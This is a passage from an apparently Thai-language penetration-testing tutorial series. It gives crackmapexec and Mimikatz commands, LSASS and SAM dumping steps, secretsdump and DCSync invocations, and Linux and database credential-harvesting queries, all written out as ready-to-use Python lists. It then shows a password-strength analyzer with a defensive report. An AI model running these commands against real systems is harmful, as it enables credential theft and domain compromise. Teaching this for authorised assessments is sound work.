print("# Execute command")
print("crackmapexec smb 192.168.1.10 -u admin -p 'Pass123' -x 'whoami'")
print("")
print("# Dump SAM")
print("crackmapexec smb 192.168.1.10 -u admin -p 'Pass123' --sam")
```

## Step 289: Advanced Password Hash Extraction

```python
#!/usr/bin/env python3
# hash_extractor.py

class HashExtractor:
    """รวมวิธีการดึง hashes จากระบบต่างๆ"""
    
    def mimikatz_commands(self) -> dict:
        """Mimikatz commands สำหรับ Windows"""
        return {
            'privilege': 'privilege::debug',
            'logonpasswords': 'sekurlsa::logonpasswords',
            'dump_all': 'sekurlsa::logonpasswords full',
            'dump_sam': 'lsadump::sam',
            'dump_secrets': 'lsadump::secrets',
            'dcsync_all': 'lsadump::dcsync /all /csv',
            'dcsync_user': 'lsadump::dcsync /user:krbtgt',
            'minidump': 'sekurlsa::minidump lsass.dmp',
            'wdigest': 'sekurlsa::wdigest',
            'tgt_list': 'sekurlsa::tickets',
            'kerberos_list': 'kerberos::list /export',
            'pass_the_hash': 'sekurlsa::pth /user:admin /domain:corp /ntlm:HASH',
            'pass_the_ticket': 'kerberos::ptt ticket.kirbi',
            'golden_ticket': 'kerberos::golden /user:admin /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /endin:600',
        }
    
    def linux_hash_extraction(self) -> list:
        """วิธีดึง hashes บน Linux"""
        return [
            # Shadow file
            'cat /etc/shadow',
            'cat /etc/passwd',
            # Unshadow
            'unshadow /etc/passwd /etc/shadow > hashes.txt',
            # Hash types ใน shadow
            # $1$ = MD5, $5$ = SHA-256, $6$ = SHA-512, $y$ = yescrypt
            # Database credentials
            'grep -r password /var/www/html/ 2>/dev/null',
            'find / -name "*.conf" -exec grep -l password {} \\;',
            # PHP sessions
            'ls /var/lib/php/sessions/',
            # SSH private keys
            'find / -name id_rsa 2>/dev/null',
            'find / -name *.pem 2>/dev/null',
            # History files
            'cat ~/.bash_history | grep -i pass',
            'cat ~/.mysql_history',
            # Keyrings
            'ls ~/.gnupg/private-keys-v1.d/',
            'find / -name "*.kdbx" 2>/dev/null',  # KeePass
        ]
    
    def windows_hash_extraction(self) -> list:
        """วิธีดึง hashes บน Windows"""
        return [
            # Dump LSASS process
            'procdump.exe -accepteula -ma lsass.exe lsass.dmp',
            'rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 644 C:\\lsass.dmp full',
            # Registry SAM backup
            'reg save HKLM\\SAM sam.hive',
            'reg save HKLM\\SYSTEM system.hive',
            'reg save HKLM\\SECURITY security.hive',
            # Offline extraction with secretsdump
            'secretsdump.py -sam sam.hive -system system.hive -security security.hive LOCAL',
            # DCSync
            'secretsdump.py corp.local/admin:Password1@192.168.1.10',
            # Volume Shadow Copy
            'vssadmin create shadow /for=C:',
            'copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM .',
            # Credential Manager
            'cmdkey /list',
            'vaultcmd /list',
            # LSA secrets via pypykatz (offline)
            'pypykatz lsa minidump lsass.dmp',
            'pypykatz registry --sam sam.hive system.hive',
        ]
    
    def database_hash_extraction(self) -> dict:
        """ดึง hashes จากฐานข้อมูล"""
        return {
            'mysql': [
                "SELECT user, authentication_string FROM mysql.user;",
                "SELECT host, user, password FROM mysql.user;",  # MySQL < 5.7
            ],
            'mssql': [
                "SELECT name, password_hash FROM sys.sql_logins;",
                "EXEC xp_cmdshell 'net user';"  # If xp_cmdshell enabled
            ],
            'postgresql': [
                "SELECT usename, passwd FROM pg_shadow;",
                "\\du+"  # List roles
            ],
            'oracle': [
                "SELECT username, password, spare4 FROM sys.user$;",
                "SELECT name, password FROM sys.user$;"  # Older versions
            ],
            'mongodb': [
                "db.system.users.find()",
                "use admin; db.getUsers()"
            ]
        }
    
    def impacket_hash_tools(self) -> dict:
        """Impacket tools สำหรับ hash extraction"""
        return {
            'secretsdump': {
                'remote': 'secretsdump.py corp.local/admin:Pass@192.168.1.10',
                'local': 'secretsdump.py -sam sam.hive -system system.hive LOCAL',
                'ntds': 'secretsdump.py -ntds ntds.dit -system system.hive LOCAL',
            },
            'dcsync': 'secretsdump.py corp.local/admin:Pass@dc01 -just-dc-user krbtgt',
            'pass_the_hash': 'secretsdump.py -hashes LM:NT corp.local/admin@target',
        }

# แสดงคำสั่ง
extractor = HashExtractor()
print("=== Windows Hash Extraction ===")
for cmd in extractor.windows_hash_extraction()[:5]:
    print(f"  {cmd}")

print("\n=== Mimikatz Key Commands ===")
cmds = extractor.mimikatz_commands()
for key in ['privilege', 'logonpasswords', 'dump_sam']:
    print(f"  {key}: {cmds[key]}")
```

## Step 290: Password Security Metrics & Reporting

```python
#!/usr/bin/env python3
# password_security_reporter.py

import hashlib
import re
import math
import json
from collections import Counter
from typing import List, Dict

class PasswordSecurityAnalyzer:
    def __init__(self):
        self.common_patterns = [
            r'^[A-Z][a-z]+\d{2,4}[!@#$]?$',  # Capital + word + number
            r'^\w+\d{4}$',  # Word + year
            r'^[A-Za-z]+123',  # Word + 123
            r'^(?i)password',  # Starts with password
            r'^(?i)(admin|user|test|guest)',  # Common prefixes
            r'^.{1,7}$',  # Too short (< 8 chars)
        ]
    
    def calculate_entropy(self, password: str) -> float:
        """คำนวณ entropy ของรหัสผ่าน (bits)"""
        charset_size = 0
        if re.search(r'[a-z]', password):
            charset_size += 26
        if re.search(r'[A-Z]', password):
            charset_size += 26
        if re.search(r'\d', password):
            charset_size += 10
        if re.search(r'[!@#$%^&*()_+\-=\[\]{}|;:,.<>?]', password):
            charset_size += 32
        
        if charset_size == 0:
            return 0.0
        
        return len(password) * math.log2(charset_size)
    
    def analyze_password_strength(self, password: str) -> Dict:
        """วิเคราะห์ความแข็งแกร่งของรหัสผ่าน"""
        analysis = {
            'password': password[:3] + '*' * (len(password) - 3),
            'length': len(password),
            'entropy_bits': self.calculate_entropy(password),
            'has_uppercase': bool(re.search(r'[A-Z]', password)),
            'has_lowercase': bool(re.search(r'[a-z]', password)),
            'has_digit': bool(re.search(r'\d', password)),
            'has_special': bool(re.search(r'[^A-Za-z0-9]', password)),
            'patterns_found': [],
            'strength': 'Unknown'
        }
        
        for pattern in self.common_patterns:
            if re.search(pattern, password):
                analysis['patterns_found'].append(pattern)
        
        # Determine strength
        entropy = analysis['entropy_bits']
        if entropy < 28:
            analysis['strength'] = 'Very Weak'
        elif entropy < 36:
            analysis['strength'] = 'Weak'
        elif entropy < 60:
            analysis['strength'] = 'Moderate'
        elif entropy < 128:
            analysis['strength'] = 'Strong'
        else:
            analysis['strength'] = 'Very Strong'
        
        return analysis
    
    def analyze_password_dataset(self, passwords: List[str]) -> Dict:
        """วิเคราะห์ชุด passwords จากการ crack"""
        stats = {
            'total': len(passwords),
            'strength_distribution': Counter(),
            'length_distribution': Counter(),
            'average_length': 0,
            'average_entropy': 0.0,
            'common_patterns': Counter(),
            'top_10_passwords': Counter(),
            'character_classes': {
                'letters_only': 0,
                'numbers_only': 0,
                'letters_numbers': 0,
                'with_special': 0
            }
        }
        
        total_length = 0
        total_entropy = 0.0
        
        for pwd in passwords:
            analysis = self.analyze_password_strength(pwd)
            stats['strength_distribution'][analysis['strength']] += 1
            stats['length_distribution'][len(pwd)] += 1
            total_length += len(pwd)
            total_entropy += analysis['entropy_bits']
            stats['top_10_passwords'][pwd] += 1
            
            # Character class
            has_letter = bool(re.search(r'[a-zA-Z]', pwd))
            has_number = bool(re.search(r'\d', pwd))
            has_special = bool(re.search(r'[^A-Za-z0-9]', pwd))
            
            if has_special:
                stats['character_classes']['with_special'] += 1
            elif has_letter and has_number:
                stats['character_classes']['letters_numbers'] += 1
            elif has_number:
                stats['character_classes']['numbers_only'] += 1
            else:
                stats['character_classes']['letters_only'] += 1
        
        if passwords:
            stats['average_length'] = total_length / len(passwords)
            stats['average_entropy'] = total_entropy / len(passwords)
        
        stats['top_10_passwords'] = stats['top_10_passwords'].most_common(10)
        
        return stats
    
    def generate_report(self, stats: Dict, org_name: str = 'Target Organization') -> str:
        """สร้างรายงานการทดสอบรหัสผ่าน"""
        report = f"""# Password Security Assessment Report
## Organization: {org_name}

### Executive Summary
- Total passwords analyzed: {stats['total']}
- Average password length: {stats['average_length']:.1f} characters
- Average entropy: {stats['average_entropy']:.1f} bits

### Strength Distribution
"""
        for strength, count in sorted(stats['strength_distribution'].items()):
            pct = (count / stats['total'] * 100) if stats['total'] > 0 else 0
            report += f"- {strength}: {count} ({pct:.1f}%)\n"
        
        report += "\n### Character Class Usage\n"
        for cls, count in stats['character_classes'].items():
            pct = (count / stats['total'] * 100) if stats['total'] > 0 else 0
            report += f"- {cls.replace('_', ' ').title()}: {count} ({pct:.1f}%)\n"
        
        report += "\n### Top 10 Most Common Passwords\n"
        for pwd, count in stats['top_10_passwords']:
            report += f"- {pwd[:3]}{'*' * (len(pwd)-3)}: {count} occurrences\n"
        
        report += """
### Recommendations
1. Enforce minimum 12-character passwords
2. Require complexity (upper, lower, digit, special)
3. Implement account lockout after 5 failed attempts
4. Deploy MFA for all privileged accounts
5. Conduct regular password audits
6. Block commonly used passwords via deny list
7. Implement password manager policy
"""
        return report

# ตัวอย่างการใช้งาน
analyzer = PasswordSecurityAnalyzer()

# Sample cracked passwords
cracked = ['Password1', 'Welcome123', 'Summer2024!', 'abc123', 
           'admin', 'P@ssw0rd', 'qwerty', 'Company2024']

stats = analyzer.analyze_password_dataset(cracked)
report = analyzer.generate_report(stats, 'ACME Corporation')
print(report)
```

---
*Part 29 เสร็จสมบูรณ์ - Steps 281-290 ครอบคลุม Password Policy Assessment, Wordlist Generation, Hashcat Advanced, John the Ripper, Credential Stuffing, Password Spraying, Rainbow Tables, Credential Reuse, Hash Extraction และ Password Security Reporting*
